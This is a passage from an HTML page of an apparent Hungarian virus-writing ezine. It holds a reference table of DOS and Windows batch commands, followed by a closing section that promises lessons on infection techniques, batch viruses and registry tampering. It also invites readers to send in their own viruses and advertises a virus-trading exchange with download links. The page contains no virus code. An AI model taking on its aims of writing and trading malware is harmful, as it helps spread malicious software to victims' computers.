    <td width="85%">
      <p align="center"><b>LEÍRÁS</b></td>
  </tr>
</table>
<table border="1" width="100%">
  <tr>
    <td width="13%" align="center"><p align="center"><font face="Comic Sans MS"><b><i>ATTRIB</i></b></font></p>
      <p><font face="Comic Sans MS"><b><i>&nbsp;</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Fájlattribútumok megjelenítése
      vagy módosítása<br>
      <br>
      ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H] [[meghajtó:][útvonal]fájlnév]
      [/S]<br>
      <br>
      + Attribútum beállítása<br>
      - Attribútum törlése<br>
      R Írásvédett fájlattribútum<br>
      A Archivált fájlattribútum<br>
      S Rendszer fájlattribútum<br>
      H Rejtett fájlattribútum<br>
      /S A megadott útvonal minden könyvtárában módosítja a fájlokat.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>TYPE</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Szövegfájlok tartalmának megjelenítése<br>
      <br>
      TYPE [meghajtó:][útvonal]fájlnév</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>DEL</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Egy vagy több fájl törlése<br>
      <br>
      DEL [meghajtó:][útvonal]fájlnév [/P]<br>
      ERASE [meghajtó:][útvonal]fájlnév [/P]<br>
      <br>
      [meghajtó:][útvonal]fájlnév  A törlendõ fájlok megadása. Több fájl is<br>
                               megadható helyettesítõ karakterek használatával.<br>
  /P                               A fájlok törlése elõtt megerõsítést kér.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>MOVE</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Fájlok áthelyezése valamint fájlok és könyvtárak átnevezése<br>
      <br>
      Egy vagy több fájlt áthelyezéséhez:<br>
      MOVE [/Y | /-Y] [meghajtó:][útvonal]fájlnév1[,...] cél<br>
      <br>
      Könyvtár átnevezéséhez:<br>
      MOVE [/Y | /-Y] [meghajtó:][útvonal]könyvtárnév1 könyvtárnév2<br>
      <br>
 [meghajtó:][útvonal]fájlnév1     Az áthelyezendõ fájl vagy fájlok nevét<br>
                                  és helyét adja meg.<br>
 cél                              A fájl új helyét adja meg. A cél egy meghajtó<br>
                                  betûjelét és kettõspontot, egy könyvtárnevet<br>
                                  vagy ezek kombinációját tartalmazhatja. Ha<br>
      <br>
                                  egyetlen fájlt helyez át, akkor egy fájlnevet<br>
                                  is belefoglalhat, ha az áthelyezéskor a fájlt<br>
                                  át szeretné nevezni.<br>
 [meghajtó:][útvonal]könyvtárnév1 Az átnevezendõ könyvtárat adja meg.<br>
 könyvtárnév2                     A könyvtár új nevét adja meg.<br>
      <br>
 /Y                               Elnyomja a könyvtár létrehozásának vagy a cél<br>
                                  felülírásának megerõsítését.<br>
 /-Y                              Kéri a könyvtár létrehozásának vagy a cél<br>
                                  felülírásának megerõsítését.<br>
      <br>
      A /Y kapcsoló szerepelhet a COPYCMD környezeti változóban.<br>
      Ezt felül lehet bírálni a parancssorban a /-Y kapcsolóval.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>REN</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Fájl és könyvtár átnevezése<br>
      <br>
      RENAME [meghajtó:][útvonal]fájlnév1 fájlnév2<br>
      REN [meghajtó:][útvonal]fájlnév1 fájlnév2<br>
      <br>
      Megjegyzés: célként új meghajtó vagy elérési út nem adható meg.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>DELTREE</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Könyvtár és a benne lévõ összes alkönyvtár törlése<br>
      <br>
      Egy vagy több fájl és könyvtár törléséhez:<br>
      DELTREE [/Y] [meghajtó:]elérési út [[meghajtó:]elérési út[...]]<br>
      <br>
  /Y                       Elnyomja az alkönyvtár törlésének megerõsítését<br>
                           kérõ szöveget.<br>
      [meghajtó:]elérési út    a törlendõ könyvtár nevét adja meg.<br>
      <br>
      Megjegyzés: A DELTREE parancsot körültekintõen kell használni. A megadott<br>
      könyvtárban lévõ összes fájl és könyvtár törlõdik.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>START</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Windows vagy MS-DOS program indítása.</font>
      <p><font face="Comic Sans MS">START [Beállítások] program [paraméterek...]<br>
      START [Beállítások] dokumentum.kiterjesztés</font></p>
      <p><font face="Comic Sans MS">/m[inimalizált] Az új program minimalizált
      (háttérben) futtatása<br>
      /max[imalizált] Az új program maximalizált (elõtérben) futtatása<br>
      /r[elõzõ méret] Az új program elõzõ méretben (elõtérben) futtatása
      (alap)<br>
      /w[várakozás]&nbsp;&nbsp; Nem tér vissza, amíg az elindított progi ki
      nem lép.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>CALL</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Egyik parancsfájl (batch fájl) hívása egy másikból<br>
      <br>
      CALL [meghajtó:][útvonal]fájlnév [parancsfájl paraméterek]<br>
      <br>
  parancsfájl paraméterek   A parancsfájl által igényelt<br>
                            parancssor-adatok megadása</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>CHOICE</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Várakozás arra, hogy a felhasználó kiválasszon egyet a választékhalmazból.<br>
      <br>
      CHOICE [/C[:]választék] [/N] [/S] [/T[:]c,nn] [szöveg]<br>
      <br>
      /C[:]választék Az engedélyezhetõ billentyûket adja meg. Az alapértelmezés IN<br>
      /N             A prompt karakterlánc végén nem jeleníti meg a választékot és<br>
               a kérdõjelet (?).<br>
      /S             Kis- és nagybetûk megkülönböztetése.<br>
      /T[:]c,nn      Alapértelmezett választás nn mp után.<br>
      szöveg         A megjelenítendõ karakterlánc<br>
      <br>
      ERRORLEVEL a megnyomott billentyû választékban elfoglalt helye.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>DATE</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">A dátum megjelenítése vagy beállítása<br>
      <br>
      DATE [dátum]<br>
      <br>
      A mai dátum beállításának megjelenítéséhez és egy új dátum megadásához<br>
      írd be paraméterek nélkül a DATE parancsot. A dátum megtartásához nyomja meg<br>
      az ENTER billentyût.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>DOSKEY</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Parancssorok szerkesztése, parancssorok újrahívása és makrók létrehozása<br>
      <br>
      DOSKEY [/kapcsoló ...] [makrónév=[szöveg]]<br>
      <br>
      /BUFSIZE:méret A makró- és parancspufferméret megadása       (alapérték:512)<br>
      /ECHO:on|off   Be- és kikapcsolja a makróbõvítéseket (alapérték:on)<br>
      /FILE:fájl     Makrók listáját tartalmazó fájl megadása<br>
      /HISTORY       A memóriában tárolt parancsok megjelenítése<br>
      /INSERT        Új karakterek beszúrása a sorba gépelés közben<br>
      /KEYSIZE:méret A billentyûzetpuffer méretének beállítása     (alapérték:15)<br>
      /LINE:méret    A sorszerkesztõ puffer maximális mérete       (alapérték:128)<br>
      /MACROS        Az összes DOSKey makró megjelenítése<br>
      /OVERSTRIKE    Az új karakterek felülírása gépelés közben (alapértelmezés)<br>
      /REINSTALL     A DOSKey új másolatának telepítése<br>
  makrónév       A létrehozott makró nevének megadása<br>
  szöveg         A makróhoz hozzárendelendõ parancsok megadása<br>
      <br>
      A FEL és LE nyíl parancsot hív vissza.<br>
      Az Esc törli az aktuális parancsot.<br>
       Az F7 a korábbi parancsokat jeleníti meg.<br>
   Az Alt+F7 törli a korábbi parancsokat.<br>
      [karakterek]F8  A [karakterek] paraméterrel kezdõdõ parancsot keresi meg.<br>
       Az F9 a parancsot a száma szerint választja ki.<br>
  Az Alt+F10 törli a makródefiníciókat.<br>
      <br>
      A következõ speciális kódokat DOSKey makródefiníciókban lehet használni:<br>
  $T     Parancselválasztó: több parancs engedélyezése a makróban<br>
  $1-$9  Kötegparaméterek: a kötegfájlok %1-%9 paramétereivel ekvivalens.<br>
  $*     A kód helyére a parancssorban, a makrónév után megadott érték kerül.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>COMMAND</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Elindítja a Windows parancsértelmezõ egy új példányát.<br>
      <br>
      COMMAND [[meghajtó:]útvonal] [eszköz] [/E:nnnnn] [/L:nnnn] [/U:nnn] [/P] [/MSG]<br>
        [/LOW] [/Y [/[C|K] parancs]]<br>
      <br>
      [meghajtó:]útvonal    A COMMAND.COM-ot tartalmazó könyvtár megadása<br>
  eszköz          A parancsbemenethez és -kimenethez használt eszköz<br>
      /E:nnnnn        A kezdõ környezet méretének beállítása nnnnn bájtra.<br>
                  (az nnnnn 256 és 32768 közötti érték legyen).<br>
  /L:nnnn         A belsõ pufferhossz mérete (a /P kapcsolóval együtt használt)<br>
                  (az nnnn 128 és 1024 közötti érték legyen).<br>
  /U:nnn          A bemeneti puffer hossza (a /P kapcsolóval együtt használt).<br>
                  (az nnn 128 és 255 között legyen).<br>
  /P              Az új parancssor állandóvá tétele (nem lehet kilépni).<br>
      /MSG            Az összes hibaüzenet tárolása a memóriában (a /P-vel együtt).<br>
      /LOW            A COMMAND rezidens adatai az alsó memóriaterületen maradnak.<br>
  /Y              A parancsfájl léptetése a /C vagy a /K kapcsoló szerint<br>
  /C parancs      Végrehajtja a megadott parancsot, majd visszatér.<br>
  /K parancs      Végrehajtja a megadott parancsot, és folytatja a futást.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>%TMP% , %TEMP%</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Környezeti változók, a TEMP könyvtár
      helyét adják meg.&nbsp;<br>
      Ált.: C:\WINDOWS\TEMP</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><p align="left"><font face="Comic Sans MS"><b><i>%WINDIR%</i></b></font></p>
    </td>
    <td width="87%"><font face="Comic Sans MS">- Környezeti változó, a
      WINDOWS könyvtár helyét adja meg.<br>
      Ált.: C:\WINDOWS</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>FIND</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Fájlban vagy fájlokban lévõ szöveges karakterlánc keresése<br>
      <br>
      FIND [/V] [/C] [/N] [/I] "karakterlánc" [[meghajtó:][útvonal]fájlnév[ ...]]<br>
      <br>
  /V        Az összes sor megjelenítése, amely NEM tartalmazza a karaktereket.<br>
  /C        Csak a karaktereket tartalmazó sorok számának megjelenítése<br>
  /N        Sorszám megjelenítése a sorok mellett<br>
  /I        A kis- és nagybetûket nem veszi figyelembe kereséskor.<br>
  "karakterlánc"<br>
            A keresendõ szöveges karakterláncot adja meg.<br>
      [meghajtó:][útvonal]fájlnév<br>
            A keresendõ fájl(ok) megadása<br>
      <br>
      Ha nincs megadva elérési út, akkor a FIND a parancssorban beírt vagy egy<br>
      másik parancsból kapcsolt szöveget keres.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>IF</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Feltételes feldolgozás végrehajtása parancsfájlban
      (batch fájl)<br>
      <br>
      IF [NOT] ERRORLEVEL szám parancs<br>
      IF [NOT] karakterlánc1==karakterlánc2 parancs<br>
      IF [NOT] EXIST fájlnév parancs<br>
      <br>
  NOT             Annak megadása, hogy a Windows csak hamis állapot esetén<br>
                  hajtsa végre a parancsot<br>
  ERRORLEVEL szám Igaz állapotot eredményez, ha az elõzõleg futtatott program                  a számnál nagyobb vagy egyenlõ kilépési kóddal tért vissza.<br>
  parancs         Annak a parancsnak a megadása, amely a feltétel                  teljesülése esetén végrehajtódik.&nbsp;<br>
  karakterlánc==karakterlánc2&nbsp; Igaz állapotot eredményez a megadott<br>
                  karakterláncok egyezõsége esetén.<br>
  EXIST fájlnév   Igaz állapotot eredményez, ha a megadott fájl létezik.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>FOR</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Megadott parancs futtatása egy fájlhalmaz minden egyes fájlján<br>
      <br>
      FOR %változó IN (halmaz) DO parancs [parancsparaméterek]<br>
      <br>
  %változó   Cserélhetõ paraméter megadása<br>
  (halmaz)   Fájlhalmazok megadása. Helyettesítõ karakterek is használhatók.<br>
  parancs    A fájlokon végrehajtott parancsok megadása parancsparaméterek<br>
             A megadott parancs paramétereit vagy kapcsolóit adja meg.<br>
      <br>
      A FOR parancs parancsfájlban a változót a %%változó szintaxissal kell megadni
      %változó helyett.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>SHIFT</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Cserélhetõ paraméterek helyének módosítása parancsfájlban
      (batch fájl)</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>PROMPT</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">A Windows parancssort módosítja.<br>
      <br>
      PROMPT [szöveg]<br>
      <br>
  szöveg    Új parancssor megadása<br>
      <br>
      A parancssor normál karakterekbõl és az alábbi speciális jelekbõl állhat:<br>
      <br>
  $Q   = (egyenlõségjel)<br>
  $$   $ (dollárjel)<br>
  $T   Aktuális idõ<br>
  $D   Aktuális dátum<br>
  $P   Aktuális meghajtó és elérési út<br>
  $V   Windows verziószám<br>
  $N   Aktuális meghajtó<br>
  $G   > (nagyobb jel)<br>
  $L   &lt; (kisebb jel)<br>
  $B   | (függõleges vonás)<br>
  $H   Backspace (az elõzõ karakter törlése)<br>
  $E   Escape kód (27-es ASCII kód)<br>
  $_   Kocsivissza és soremelés<br>
      <br>
      A parancssor alapértékének visszaállításához paraméterek nélkül írd be
      a<br>
      PROMPT parancsot.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>DIR</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Könyvtárban lévõ fájlok és alkönyvtárak listájának megjelenítése<br>
      <br>
      DIR [meghajtó:][elérési út][fájlnév] [/P] [/W] [/A[[:]attribútumok]]<br>
     [/O[[:]rendezés]] [/S] [/B] [/L] [/V] [/4]<br>
      <br>
      [meghajtó:][útvonal][fájlnév]<br>
               Megadja a listázandó meghajtót, könyvtárat, illetve fájlokat.<br>
               (Lehet bõvített fájlmegadás vagy több fájl megadása is.)<br>
  /P           Várakozás minden képernyõ után<br>
  /W           Széles listázási formátum használata<br>
  /A           A megadott attribútumú fájl megjelenítése<br>
  attribútumok D  Könyvtárak                  R  Írásvédett fájlok<br>
               H  Rejtett fájlok              A  Archiválandó fájlok<br>
               S  Rendszerfájlok              -  logikai NEM elõtag<br>
  /O           A fájlok rendezett sorrendû listázása<br>
  rendezés     N  Név szerint (ábécérendben)<br>
               S  Méret szerint (elõbb a kisebbek)<br>
               E  Kiterjesztés szerint (ábécérendben)<br>
               D  Dátum és idõ szerint (elõbb a korábbiak)<br>
               G  Elõbb a csoportkönyvtárak<br>
               -  Fordított sorrend (elõtag)<br>
               A  A legutóbbi hozzáférés szerint (elõbb a korábbiak)<br>
  /S           Adott könyvtárban és alkönyvtáraiban lévõ fájlok megjelenítése<br>
  /B           Egyszerû formátum (fejléc és összegzés nélkül<br>
  /L           Kisbetûk használata<br>
  /V           Részletes mód<br>
  /4           négyjegyû évszámok (/V -vel együtt hatástalan).<br>
      <br>
      A DIRCMD környezeti változóban elõre be lehet állítani kapcsolókat.<br>
      Az elõre beállított kapcsolókat kötõjellel (-) lehet felülbírálni; például: /-W.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>COPY</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Egy vagy több fájl másolása egy másik helyre<br>
      <br>
      COPY [/A | /B] forrás [/A | /B] [+ forrás [/A | /B] [+ ...]] [cél]<br>
  [/A | /B]] [/V] [/Y | /-Y]<br>
      <br>
  forrás       A másolandó fájl(ok) megadása<br>
  /A           A fájl ASCII szövegfájl<br>
  /B           A fájl bináris fájl<br>
  cél          Az új fájl(ok) könyvtár-, illetve fájlnevének megadása<br>
  /V           Ellenõrzés az új fájlok írásakor<br>
  /Y           A megerõsítés kikapcsolása létezõ<br>
               fájlok felülírásakor<br>
  /-Y          A megerõsítés bekapcsolása létezõ<br>
               fájlok felülírásakor<br>
      <br>
      A /Y kapcsolót elõre be lehet állítani a COPYCMD környezeti változóban.<br>
      Ez felülbírálható a parancssorban a /-Y kapcsolóval.<br>
      <br>
      Fájlok hozzáfûzéséhez célként adjon meg egyetlen fájlt, de forrásként több<br>
      fájlt (helyettesítõ karakterek vagy a fájl1+fájl2+fájl3 alak használatával).</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>CHCP</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Az aktív kódlap számának megjelenítése vagy beállítása<br>
      <br>
      CHCP [nnn]<br>
      <br>
  nnn   A kódlapszám megadása<br>
      <br>
      A CHCP paraméter nélküli beírásakor az aktív kódlapszám kerül kiírásra.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>LFNFOR</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">Hosszú fájlneveket engedélyez vagy tilt FOR parancsok feldolgozásakor.<br>
      <br>
      LFNFOR [ON | OFF]<br>
      <br>
      Az aktuális beállítás megjelenítéséhez írd be az LFNFOR parancsot paraméterek
      nélkül.</font></td>
  </tr>
  <tr>
    <td width="13%" align="center"><font face="Comic Sans MS"><b><i>BREAK</i></b></font></td>
    <td width="87%"><font face="Comic Sans MS">A kiterjesztett CTRL+C ellenõrzés beállítása vagy törlése.<br>
      <br>
      BREAK [ON | OFF]<br>
      <br>
      A BREAK aktuális beállításának megjelenítéséhez írd be paraméter nélkül a<br>
      BREAK parancsot.</font></td>
  </tr>
</table>
<p align="left">&nbsp;</p>
<hr>
<p align="center"><b><font face="Comic Sans MS"><br>
MÁRA ENNYI...</font></b></p>
<p align="left"><font face="Comic Sans MS">Ha k&iacute;v&aacute;ncsiak vagytok
a folytat&aacute;sra, a k&ouml;vetkez&otilde; ezine-ben &uacute;jabb fert&otilde;z&eacute;si
technik&aacute;kkal ismerkedhettek meg. Megtanulhatj&aacute;tok tov&aacute;bb&aacute;
a WIN32-es BAT vírusok mûködését, a regisztrációs adatbázis matatását
BAT-ból, &eacute;s beleszagolunk
egy kicsit az id&otilde;z&iacute;t&eacute;sbe. Illetve&nbsp; megtanuljuk, hogyan &iacute;rhatunk val&oacute;ban
profi, m&aacute;r nem tiszt&aacute;n BAT v&iacute;rust, mely m&aacute;r olyan
tulajdons&aacute;gokkal rendelkezik, mint egy DOS-os v&iacute;rus, vagyis DOS-os
v&iacute;rusok implement&aacute;l&aacute;sa BAT-ba. (A következõ lesz a legjobb r&eacute;sz.)
És természetesen újabb parancsokat is megismerhettek. Profik leszünk a végére
gyerekek, nekem elhihetitek... Kérés kérdés, panasz, óhaj, sóhaj, a sajátkészítésû
virii-k, meg bármi miatt írjatok a postámba. A címem <a href="#CIM">ITT</a>
található.</font></p>
<p align="left">&nbsp;<a name="CIM"></a><hr>
<p align="center"><font face="Times New Roman" size="4"><b><i><u><br>
K&eacute;sz&iacute;tette : Black Cat<br>
</u></i></b></font><b><i><u><br>
</u></i></b><a href="mailto:bcat_h@yahoo.com"><b><i><u>BCAT_H@YAHOO.COM</u></i></b></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src="cat.gif" align="middle" width="87" height="89" border="0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="http://jump.to/bcves"><b><i><u>HTTP://JUMP.TO/BCVES</u></i></b></a></p>
<p align="center"><b>The Black Cat Virus Exchange System</b></p>
<p align="center"><b>More than 25000 virii for trading.</b></p>
<p align="center">He is a virus trader/writer and member of the FCF (Formater's
Cracking Force).</p>
<p align="center">The FCF can be reached via <a href="http://jump.to/fcf" target="_blank">http://jump.to/fcf</a></p>
<p align="center">Interested in further developments and updates? Visit the <a href="http://jump.to/bcves" target="_blank">Black
Cat Virus Exchange System</a>!<br>
Black Cat's logs can d/led via: <a href="http://bcves.jump.to/bclogs.rar">http://bcves.jump.to/bclogs.rar</a><br>
Black Cat's trading page can be found: <a href="http://bcves.jump.to/bclogs.rar">http://bcves.jump.to/trading.htm<br>
</a><br>
The Virus Sorter New Generation COMPLETE PACKAGE can be downloaded via: <a href="http://bcves.jump.to/vsng.rar">http://bcves.jump.to/vsng.rar<br>
</a>The package contains the complete HELP and any additional files. (pictures,
url shortcuts, etc.) Size: 140K</p>
<p align="center">The Virus Sorter New Generation SIMPLE PACK can be downloaded
via: <a href="http://bcves.jump.to/vsng.exe">http://bcves.jump.to/vsng.exe<br>
</a>D/L, and GO! Nothing to do with it! (not recommended for 1st time users)
Size: 60K&nbsp;<br>
</p>
<p align="center">Would u like to trade? What are you waiting for?</p>
<p align="center">The Black Cat Virus Exchange System provides a powerfull, and
completely free home of trading, and traders. Would u like to be a member? Would
u like a trading page at BCVES? Would you like to meet other traders? Would you
like yourself to be distributed with this (vsng complete) package? In the URLS
subdirectory all BCVES members' BCVES URL can be found as W9X Internet shortcut
icons.&nbsp;<br>
<a href="mailto:bcves-subscribe@egroups.com">First, subscribe to the Black Cat
Virus Exchange System's egroup</a> <a href="mailto:(bcves-subscribe@egroups.com">(bcves-subscribe@egroups.com</a>)</p>
<p align="center">Than send a letter to Black Cat, with the following
information:<br>
- Name (nickname)<br>
- A short message (optional)<br>
- The place (URL) of your logs<br>
- The place (URL) of your log statistics<br>
- The place (URL) of your PGP key (optional)<br>
- Your email address<br>
And that's all. After some day, you'll be up. Why to choose BCVES? More than 150
visitors a week. :)</p>
<p align="center">Do you need privacy? D/l the <a href="http://bcves.jump.to/bcves.asc">BCVES's
PGP key</a> (<a href="http://bcves.jump.to/bcves.asc">http://bcves.jump.to/bcves.asc</a>)<br>
Would you like to use PGP when writing to Black Cat? PGP can be found <a href="http://bcves.jump.to/blackcat.asc">here</a>
(<a href="http://bcves.jump.to/blackcat.asc">http://bcves.jump.to/blackcat.asc</a>)!&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#FF0000">HAPPY TRADING!!</font></p>
</body>

</html>